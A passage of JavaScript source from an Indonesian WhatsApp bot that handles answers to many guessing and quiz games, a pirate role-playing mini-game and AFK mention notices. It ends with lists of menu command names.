return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
}).filter(v => v).join('\n')}
${isSurender ? '' : ``}`.trim()
			vreden.sendTextWithMentions(m.chat, caption, m)
				.then(mes => {
					return _family100['family100' + m.chat].pesan = mesg
				}).catch(_ => _)
			if (isWin || isSurender) delete _family100['family100' + m.chat]
		}
		if (tebakgame[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakgame[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakgame[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (m.text.toLowerCase() == jawaban) {
					usersdb[m.sender].saldo += tebakgame[m.chat][2]
					usersdb[m.sender].rank += await randomNomor(40)
					JwbTrue("Tebak Game", tebakgame[m.chat][2], `\n\nKirim perintah .tebakgame\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakgame[m.chat][3])
					delete tebakgame[m.chat]
				} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
					m.reply(`_Ya, Dikit Lagi!_`)
				else vreden.sendMessage(m.chat, {
					react: {
						text: "❌",
						key: m.key,
					}
				})
			}
		}
		if (tebakhero[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakhero[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakhero[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (m.text.toLowerCase() == jawaban) {
					usersdb[m.sender].saldo += tebakhero[m.chat][2]
					usersdb[m.sender].rank += await randomNomor(40)
					JwbTrue("Tebak Hero", tebakhero[m.chat][2], `\n\nKirim perintah .tebakhero\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakhero[m.chat][3])
					delete tebakhero[m.chat]
				} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
					m.reply(`_Ya, Dikit Lagi!_`)
				else vreden.sendMessage(m.chat, {
					react: {
						text: "❌",
						key: m.key,
					}
				})
			}
		}
		if (tebakff[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakff[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakff[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (m.text.toLowerCase() == jawaban) {
					usersdb[m.sender].saldo += tebakff[m.chat][2]
					usersdb[m.sender].rank += await randomNomor(40)
					JwbTrue("Tebak Free Fire", tebakff[m.chat][2], `\n\nKirim perintah .tebakff\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakff[m.chat][3])
					delete tebakff[m.chat]
				} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
					m.reply(`_Ya, Dikit Lagi!_`)
				else vreden.sendMessage(m.chat, {
					react: {
						text: "❌",
						key: m.key,
					}
				})
			}
		}
		if (tebakkabupaten[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakkabupaten[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakkabupaten[m.chat][1]))
				jawaban = json.title.toLowerCase().trim()
				if (m.text.toLowerCase() == jawaban) {
					usersdb[m.sender].saldo += tebakkabupaten[m.chat][2]
					usersdb[m.sender].rank += await randomNomor(40)
					JwbTrue("Tebak Kabupaten", tebakkabupaten[m.chat][2], `\n\nKirim perintah .tebakkabupaten\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakkabupaten[m.chat][3])
					delete tebakkabupaten[m.chat]
				} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
					m.reply(`_Ya, Dikit Lagi!_`)
				else vreden.sendMessage(m.chat, {
					react: {
						text: "❌",
						key: m.key,
					}
				})
			}
		}
		if (tebakjkt48[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakjkt48[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakjkt48[m.chat][1]))
				jawaban = json.name.toLowerCase().trim()
				if (m.text.toLowerCase() == jawaban) {
					usersdb[m.sender].saldo += tebakjkt48[m.chat][2]
					usersdb[m.sender].rank += await randomNomor(40)
					JwbTrue("Tebak JKT48", tebakjkt48[m.chat][2], `\n\nKirim perintah .tebakjkt48\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakjkt48[m.chat][3])
					delete tebakjkt48[m.chat]
				} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
					m.reply(`_Ya, Dikit Lagi!_`)
				else vreden.sendMessage(m.chat, {
					react: {
						text: "❌",
						key: m.key,
					}
				})
			}
		}
		if (tebakhewan[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakhewan[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakhewan[m.chat][1]))
				jawaban = json.title.toLowerCase().trim()
				if (m.text.toLowerCase() == jawaban) {
					usersdb[m.sender].saldo += tebakhewan[m.chat][2]
					usersdb[m.sender].rank += await randomNomor(40)
					JwbTrue("Tebak Hewan", tebakhewan[m.chat][2], `\n\nKirim perintah .tebakhewan\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakhewan[m.chat][3])
					delete tebakhewan[m.chat]
				} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
					m.reply(`_Ya, Dikit Lagi!_`)
				else vreden.sendMessage(m.chat, {
					react: {
						text: "❌",
						key: m.key,
					}
				})
			}
		}
		if (tebakml[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakml[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakml[m.chat][1]))
				jawaban = json.title.toLowerCase().trim()
				if (m.text.toLowerCase() == jawaban) {
					usersdb[m.sender].saldo += tebakml[m.chat][2]
					usersdb[m.sender].rank += await randomNomor(40)
					JwbTrue("Tebak Sound ML", tebakml[m.chat][2], `\n\nKirim perintah .tebakml\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakml[m.chat][3])
					delete tebakml[m.chat]
				} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
					m.reply(`_Ya, Dikit Lagi!_`)
				else vreden.sendMessage(m.chat, {
					react: {
						text: "❌",
						key: m.key,
					}
				})
			}
		}
		if (tebakchara[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakchara[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakchara[m.chat][1]))
				jawaban = json.name.toLowerCase().trim()
				if (m.text.toLowerCase() == jawaban) {
					usersdb[m.sender].saldo += tebakchara[m.chat][2]
					usersdb[m.sender].rank += await randomNomor(40)
					JwbTrue("Tebak Anime", tebakchara[m.chat][2], `\n\nKirim perintah .tebakchara\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakchara[m.chat][3])
					delete tebakchara[m.chat]
				} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
					m.reply(`_Ya, Dikit Lagi!_`)
				else vreden.sendMessage(m.chat, {
					react: {
						text: "❌",
						key: m.key,
					}
				})
			}
		}
		if (tebaklogo[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebaklogo[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebaklogo[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (m.text.toLowerCase() == jawaban) {
					usersdb[m.sender].saldo += tebaklogo[m.chat][2]
					usersdb[m.sender].rank += await randomNomor(40)
					JwbTrue("Tebak Logo", tebaklogo[m.chat][2], `\n\nKirim perintah .tebaklogo\nuntuk bermain lagi 🎮`)
					clearTimeout(tebaklogo[m.chat][3])
					delete tebaklogo[m.chat]
				} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
					m.reply(`_Ya, Dikit Lagi!_`)
				else vreden.sendMessage(m.chat, {
					react: {
						text: "❌",
						key: m.key,
					}
				})
			}
		}
		if (tebakaplikasi[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakaplikasi[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakaplikasi[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (m.text.toLowerCase() == jawaban) {
					usersdb[m.sender].saldo += tebakaplikasi[m.chat][2]
					usersdb[m.sender].rank += await randomNomor(40)
					JwbTrue("Tebak Aplikasi", tebakaplikasi[m.chat][2], `\n\nKirim perintah .tebakaplikasi\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakaplikasi[m.chat][3])
					delete tebakaplikasi[m.chat]
				} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
					m.reply(`_Ya, Dikit Lagi!_`)
				else vreden.sendMessage(m.chat, {
					react: {
						text: "❌",
						key: m.key,
					}
				})
			}
		}
		if (tebakgambar[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakgambar[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakgambar[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (m.text.toLowerCase() == jawaban) {
					usersdb[m.sender].saldo += tebakgambar[m.chat][2]
					usersdb[m.sender].rank += await randomNomor(40)
					JwbTrue("Tebak Gambar", tebakgambar[m.chat][2], `\n\nKirim perintah .tebakgambar\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakgambar[m.chat][3])
					delete tebakgambar[m.chat]
				} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
					m.reply(`_Ya, Dikit Lagi!_`)
				else vreden.sendMessage(m.chat, {
					react: {
						text: "❌",
						key: m.key,
					}
				})
			}
		}
		if (tebakkata[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakkata[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakkata[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (m.text.toLowerCase() == jawaban) {
					usersdb[m.sender].saldo += tebakkata[m.chat][2]
					usersdb[m.sender].rank += await randomNomor(40)
					JwbTrue("Tebak Kata", tebakkata[m.chat][2], `\n\nKirim perintah .tebakkata\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakkata[m.chat][3])
					delete tebakkata[m.chat]
				} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
					m.reply(`_Ya, Dikit Lagi!_`)
				else vreden.sendMessage(m.chat, {
					react: {
						text: "❌",
						key: m.key,
					}
				})
			}
		}
		if (asahotak[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == asahotak[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(asahotak[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (m.text.toLowerCase() == jawaban) {
					usersdb[m.sender].saldo += asahotak[m.chat][2]
					usersdb[m.sender].rank += await randomNomor(40)
					JwbTrue("Asah Otak", asahotak[m.chat][2], `\n\nKirim perintah .asahotak\nuntuk bermain lagi 🎮`)
					clearTimeout(asahotak[m.chat][3])
					delete asahotak[m.chat]
				} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
					m.reply(`_Ya, Dikit Lagi!_`)
				else vreden.sendMessage(m.chat, {
					react: {
						text: "❌",
						key: m.key,
					}
				})
			}
		}
		if (lengkapikalimat[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == lengkapikalimat[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(lengkapikalimat[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (m.text.toLowerCase() == jawaban) {
					usersdb[m.sender].saldo += lengkapikalimat[m.chat][2]
					usersdb[m.sender].rank += await randomNomor(40)
					JwbTrue("Lengkapi Kalimat", lengkapikalimat[m.chat][2], `\n\nKirim perintah .lengkapikalimat\nuntuk bermain lagi 🎮`)
					clearTimeout(lengkapikalimat[m.chat][3])
					delete lengkapikalimat[m.chat]
				} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
					m.reply(`_Ya, Dikit Lagi!_`)
				else vreden.sendMessage(m.chat, {
					react: {
						text: "❌",
						key: m.key,
					}
				})
			}
		}
		if (tebakbendera[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakbendera[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakbendera[m.chat][1]))
				jawaban = json.name.toLowerCase().trim()
				if (m.text.toLowerCase() == jawaban) {
					usersdb[m.sender].saldo += tebakbendera[m.chat][2]
					usersdb[m.sender].rank += await randomNomor(40)
					JwbTrue("Tebak Bendera", tebakbendera[m.chat][2], `\n\nKirim perintah .tebakbendera\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakbendera[m.chat][3])
					delete tebakbendera[m.chat]
				} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
					m.reply(`_Ya, Dikit Lagi!_`)
				else vreden.sendMessage(m.chat, {
					react: {
						text: "❌",
						key: m.key,
					}
				})
			}
		}
		if (caklontong[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == caklontong[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(caklontong[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (m.text.toLowerCase() == jawaban) {
					usersdb[m.sender].saldo += caklontong[m.chat][2]
					usersdb[m.sender].rank += await randomNomor(40)
					JwbTrue("Cak Lontong", caklontong[m.chat][2], `\n\nKirim perintah .caklontong\nuntuk bermain lagi 🎮`)
					clearTimeout(caklontong[m.chat][3])
					delete caklontong[m.chat]
				} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
					m.reply(`_Ya, Dikit Lagi!_`)
				else vreden.sendMessage(m.chat, {
					react: {
						text: "❌",
						key: m.key,
					}
				})
			}
		}
		if (susunkata[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == susunkata[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(susunkata[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (m.text.toLowerCase() == jawaban) {
					usersdb[m.sender].saldo += susunkata[m.chat][2]
					usersdb[m.sender].rank += await randomNomor(40)
					JwbTrue("Susun Kata", susunkata[m.chat][2], `\n\nKirim perintah .susunkata\nuntuk bermain lagi 🎮`)
					clearTimeout(susunkata[m.chat][3])
					delete susunkata[m.chat]
				} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
					m.reply(`_Ya, Dikit Lagi!_`)
				else vreden.sendMessage(m.chat, {
					react: {
						text: "❌",
						key: m.key,
					}
				})
			}
		}
		if (tebakkalimat[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakkalimat[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakkalimat[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (m.text.toLowerCase() == jawaban) {
					usersdb[m.sender].saldo += tebakkalimat[m.chat][2]
					usersdb[m.sender].rank += await randomNomor(40)
					JwbTrue("Tebak Kalimat", tebakkalimat[m.chat][2], `\n\nKirim perintah .tebakkalimat\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakkalimat[m.chat][3])
					delete tebakkalimat[m.chat]
				} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
					m.reply(`_Ya, Dikit Lagi!_`)
				else vreden.sendMessage(m.chat, {
					react: {
						text: "❌",
						key: m.key,
					}
				})
			}
		}
		if (siapaaku[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == siapaaku[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(siapaaku[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (m.text.toLowerCase() == jawaban) {
					usersdb[m.sender].saldo += siapaaku[m.chat][2]
					usersdb[m.sender].rank += await randomNomor(40)
					JwbTrue("Tebak Siapa", siapaaku[m.chat][2], `\n\nKirim perintah .tebaksiapa\nuntuk bermain lagi 🎮`)
					clearTimeout(siapaaku[m.chat][3])
					delete siapaaku[m.chat]
				} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
					m.reply(`_Ya, Dikit Lagi!_`)
				else vreden.sendMessage(m.chat, {
					react: {
						text: "❌",
						key: m.key,
					}
				})
			}
		}
		if (tekateki[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tekateki[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tekateki[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (m.text.toLowerCase() == jawaban) {
					usersdb[m.sender].saldo += tekateki[m.chat][2]
					usersdb[m.sender].rank += await randomNomor(40)
					JwbTrue("Teka Teki", tekateki[m.chat][2], `\n\nKirim perintah .tekateki\nuntuk bermain lagi 🎮`)
					clearTimeout(tekateki[m.chat][3])
					delete tekateki[m.chat]
				} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
					m.reply(`_Ya, Dikit Lagi!_`)
				else vreden.sendMessage(m.chat, {
					react: {
						text: "❌",
						key: m.key,
					}
				})
			}
		}
		if (tebakkimia[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebakkimia[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebakkimia[m.chat][1]))
				jawaban = json.unsur.toLowerCase().trim()
				if (m.text.toLowerCase() == jawaban) {
					usersdb[m.sender].saldo += tebakkimia[m.chat][2]
					usersdb[m.sender].rank += await randomNomor(40)
					JwbTrue("Teka Kimia", tebakkimia[m.chat][2], `\n\nKirim perintah .tebakkimia\nuntuk bermain lagi 🎮`)
					clearTimeout(tebakkimia[m.chat][3])
					delete tebakkimia[m.chat]
				} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
					m.reply(`_Ya, Dikit Lagi!_`)
				else vreden.sendMessage(m.chat, {
					react: {
						text: "❌",
						key: m.key,
					}
				})
			}
		}
		if (tebaklirik[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebaklirik[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebaklirik[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (m.text.toLowerCase() == jawaban) {
					usersdb[m.sender].saldo += tebaklirik[m.chat][2]
					usersdb[m.sender].rank += await randomNomor(40)
					JwbTrue("Teka Lirik", tebaklirik[m.chat][2], `\n\nKirim perintah .tebaklirik\nuntuk bermain lagi 🎮`)
					clearTimeout(tebaklirik[m.chat][3])
					delete tebaklirik[m.chat]
				} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
					m.reply(`_Ya, Dikit Lagi!_`)
				else vreden.sendMessage(m.chat, {
					react: {
						text: "❌",
						key: m.key,
					}
				})
			}
		}
		if (tebaktebakan[m.chat] && !isCmd && m.quoted) {
			if (m.quoted.id == tebaktebakan[m.chat][0].key.id) {
				let json = JSON.parse(JSON.stringify(tebaktebakan[m.chat][1]))
				jawaban = json.jawaban.toLowerCase().trim()
				if (m.text.toLowerCase() == jawaban) {
					usersdb[m.sender].saldo += tebaktebakan[m.chat][2]
					usersdb[m.sender].rank += await randomNomor(40)
					JwbTrue("Teka Tebakan", tebaktebakan[m.chat][2], `\n\nKirim perintah .tebaktebakan\nuntuk bermain lagi 🎮`)
					clearTimeout(tebaktebakan[m.chat][3])
					delete tebaktebakan[m.chat]
				} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
					m.reply(`_Ya, Dikit Lagi!_`)
				else vreden.sendMessage(m.chat, {
					react: {
						text: "❌",
						key: m.key,
					}
				})
			}
		}
		if (pirates[m.sender] && !isCmd) {
			if (body.toLowerCase() == "serang") {
				if (pirates[m.sender][1] === "kargo") poink = 40
				if (pirates[m.sender][1] === "pesiar") poink = 60
				if (pirates[m.sender][1] === "nelayan") poink = 20
				if (pirates[m.sender][1] === "perang") poink = 80
				if (pirates[m.sender][1] === "tanker") poink = 40
				if (pirates[m.sender][1] === "kontainer") poink = 40
				if (pirates[m.sender][1] === "feri") poink = 30
				let poinkru = pirates[m.sender][2] / 2
				let point = poink + poinkru
				let pon = poink / 2
				let duit = `${point}00000`
				let cekk = 60
				if (point < cekk) {
					editp("Memulai Penyerangan!🏴‍☠️", "Kapten Kapal Berhasil Disandera!", `Pembajakan Berhasil!\nMengambil Alih Kapal!🏴‍☠️`)
					rpgdb[m.sender].darahkapal -= 20
					rpgdb[m.sender].kayu += poink
					rpgdb[m.sender].kain += pon
					usersdb[m.sender].saldo += parseInt(duit)
					await sleep(5000)
					let teks = `*🏴‍☠️DESTINASI SAMPAI🏴‍☠️*\n\n📍 ${pirates[m.sender][3]}\n*Reward Perjalanan:*\n- Uang: ${duit} (Tebusan)\n- Kayu: ${poink} (Rombak Kapal)\n- Kain: ${pon} (Rombak Layar)\n\n`
					await vreden.sendMessage(m.chat, {
						text: teks,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: idsaluran,
								serverMessageId: null,
								newsletterName: `${namasaluran}`
							},
							externalAdReply: {
								title: "PIRATE ADVENTURE",
								body: 'Sail across the ocean and go on adventures',
								thumbnailUrl: "https://telegra.ph/file/929e089ce3e77a38c398b.jpg",
								sourceUrl: "-",
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
				} else {
					m.sendForward('Kamu Kalah Battle, Kapal Kamu Mengalami Kerusakan Parah!')
					rpgdb[m.sender].darahkapal = 0
					await sleep(5000)
					m.reply('Kamu Telah Sampai Ke Tujuan, Kamu Tidak Memperoleh Reward Karena Kalah Battle')
				}
				clearTimeout(pirates[m.sender][4])
				delete pirates[m.sender]
			}
		}
		if (kuisioner[m.chat] && !isCmd) {
			let jwbn = ["A", "B", "C", "a", "b", "c"]
			if (jwbn.includes(body)) {
				let json = JSON.parse(JSON.stringify(kuisioner[m.chat][1]))
				jawaban = json.correctAnswer.toLowerCase().trim()
				if (body.toLowerCase() == jawaban) {
					usersdb[m.sender].saldo += kuisioner[m.chat][2]
					usersdb[m.sender].rank += await randomNomor(40)
					JwbTrue("Quizioner", kuisioner[m.chat][2], `\n\nKirim perintah .kuisioner\nuntuk bermain lagi 🎮`)
					clearTimeout(kuisioner[m.chat][3])
					delete kuisioner[m.chat]
				} else {
					clearTimeout(kuisioner[m.chat][3])
					delete kuisioner[m.chat]
					let rk = await randomNomor(40)
					usersdb[m.sender].rank -= rk
					return vreden.sendMessage(m.chat, {
						text: `_Jawaban Salah_😏\n\n*- ${rk} Points Rank*`
					}, {
						quoted: fchannel
					})
				}
			}
		}

		if (mathgame[m.chat] && !isCmd) {
			let jwbn = ["A", "B", "C", "a", "b", "c"]
			if (jwbn.includes(body)) {
				let json = mathgame[m.chat][1]
				jawaban = json.toLowerCase().trim()
				if (body.toLowerCase() == jawaban) {
					usersdb[m.sender].saldo += mathgame[m.chat][2]
					usersdb[m.sender].rank += await randomNomor(40)
					JwbTrue("Math Game", mathgame[m.chat][2], `\n\nKirim perintah .math\nuntuk bermain lagi 🎮`)
					clearTimeout(mathgame[m.chat][3])
					delete mathgame[m.chat]
				} else {
					clearTimeout(mathgame[m.chat][3])
					delete mathgame[m.chat]
					let rk = await randomNomor(40)
					usersdb[m.sender].rank -= rk
					return vreden.sendMessage(m.chat, {
						text: `_Jawaban Salah_😏\n\n*- ${rk} Points Rank*`
					}, {
						quoted: fchannel
					})
				}
			}
		}

		async function cekgame(gamejid) {
			if (tekateki[gamejid]) {
				vreden.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tekateki[gamejid][0]
				})
				return true
			} else if (caklontong[gamejid]) {
				vreden.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: caklontong[gamejid][0]
				})
				return true
			} else if (susunkata[gamejid]) {
				vreden.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: susunkata[gamejid][0]
				})
				return true
			} else if (kuisioner[gamejid]) {
				vreden.sendMessage(gamejid, {
					text: "Soal kuisioner belum selesai"
				}, {
					quoted: kuisioner[gamejid][0]
				})
				return true
			} else if (mathgame[gamejid]) {
				vreden.sendMessage(gamejid, {
					text: "Soal Mathgame belum selesai"
				}, {
					quoted: mathgame[gamejid][0]
				})
				return true
			} else if (tebaktebakan[gamejid]) {
				vreden.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebaktebakan[gamejid][0]
				})
				return true
			} else if (tebaklirik[gamejid]) {
				vreden.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebaklirik[gamejid][0]
				})
				return true
			} else if (tebakkimia[gamejid]) {
				vreden.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebakkimia[gamejid][0]
				})
				return true
			} else if (siapaaku[gamejid]) {
				vreden.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: siapaaku[gamejid][0]
				})
				return true
			} else if (tebakkalimat[gamejid]) {
				vreden.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebakkalimat[gamejid][0]
				})
				return true
			} else if (tebakbendera[gamejid]) {
				vreden.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebakbendera[gamejid][0]
				})
				return true
			} else if (tebakkata[gamejid]) {
				vreden.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebakkata[gamejid][0]
				})
				return true
			} else if (asahotak[gamejid]) {
				vreden.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: asahotak[gamejid][0]
				})
				return true
			} else if (lengkapikalimat[gamejid]) {
				vreden.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: lengkapikalimat[gamejid][0]
				})
				return true
			} else if (tebakgame[gamejid]) {
				vreden.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebakgame[gamejid][0]
				})
				return true
			} else if (tebakhero[gamejid]) {
				vreden.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebakhero[gamejid][0]
				})
				return true
			} else if (tebakff[gamejid]) {
				vreden.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebakff[gamejid][0]
				})
				return true
			} else if (tebakkabupaten[gamejid]) {
				vreden.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebakkabupaten[gamejid][0]
				})
				return true
			} else if (tebakjkt48[gamejid]) {
				vreden.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebakjkt48[gamejid][0]
				})
				return true
			} else if (tebakhewan[gamejid]) {
				vreden.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebakhewan[gamejid][0]
				})
				return true
			} else if (tebakml[gamejid]) {
				vreden.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebakml[gamejid][0]
				})
				return true
			} else if (tebakchara[gamejid]) {
				vreden.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebakchara[gamejid][0]
				})
				return true
			} else if (tebaklogo[gamejid]) {
				vreden.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebaklogo[gamejid][0]
				})
				return true
			} else if (tebakaplikasi[gamejid]) {
				vreden.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebakaplikasi[gamejid][0]
				})
				return true
			} else if (tebakgambar[gamejid]) {
				vreden.sendMessage(gamejid, {
					text: "Soal ini belum selesai"
				}, {
					quoted: tebakgambar[gamejid][0]
				})
				return true
			} else {
				return false
			}
		}

		if (m.isGroup && !m.key.fromMe) {
			let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
			for (let ment of mentionUser) {
				if (afk.checkAfkUser(ment, _afk)) {
					let getId2 = afk.getAfkId(ment, _afk)
					let getReason2 = afk.getAfkReason(getId2, _afk)
					let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
					let heheh2 = ms(getTimee)
					m.reply(`Jangan tag, dia sedang sibuk\n\n*Alasan:* ${getReason2}\n*Sejak :* ${heheh2.hours} jam, ${heheh2.minutes} menit, ${heheh2.seconds} detik yg lalu\n`)
				}
			}
			if (afk.checkAfkUser(m.sender, _afk)) {
				let getId = afk.getAfkId(m.sender, _afk)
				let getReason = afk.getAfkReason(getId, _afk)
				let getTime = Date.now() - afk.getAfkTime(getId, _afk)
				let heheh = ms(getTime)
				_afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
				fs.writeFileSync('./database/afk.json', JSON.stringify(_afk))
				vreden.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} telah kembali dari afk\n\n*Alasan :* ${getReason}\n*Selama :* ${heheh.hours} jam ${heheh.minutes} menit ${heheh.seconds} detik\n`, m)
			}
		}

		const totalFitur = () => {
			var mytext = fs.readFileSync("./vreden.js").toString()
			var numUpper = (mytext.match(/case '/g) || []).length;
			return numUpper
		}

		const cmdRPG = ["mingguan", "bulanan", "crafting", "heal", "joinrpg", "kerja", "merampok", "memancing", "repair", "adventure", "mining", "jual", "beli", "berburu", "nebang", "berlayar", "inventory", "redeemdel", "redeemset", "redeem"]
		const cmdPanel = ["addsrv", "addusr", "listsrv", "listusr", "addusradmin", "restartsrv", "stopsrv", "startsrv", "delusr", "delsrv", "1gb", "2gb", "3gb", "4gb", "5gb", "6gb", "7gb", "8gb", "9gb", "10gb", "11gb", "12gb", "13gb", "14gb", "15gb", "16gb", "17gb", "18gb", "19gb", "20gb", "unli"]
		const cmdSim = ["panelmenu", "rpgmenu", "mainmenu", "simplemenu", "allmenu", "groupmenu", "gamemenu", "storemenu", "anonymousmenu", "convertmenu", "cewekasiamenu", "randomquotes", "randommenu", "searchmenu", "downloadmenu", "asupanmenu", "storagemenu", "ownermenu", "balancemenu", "cowokasiamenu", "bugmenu", "islammenu", "funmenu", "stalkingmenu", "randomsticker", "ephotomenu", "nsfwmenu"]
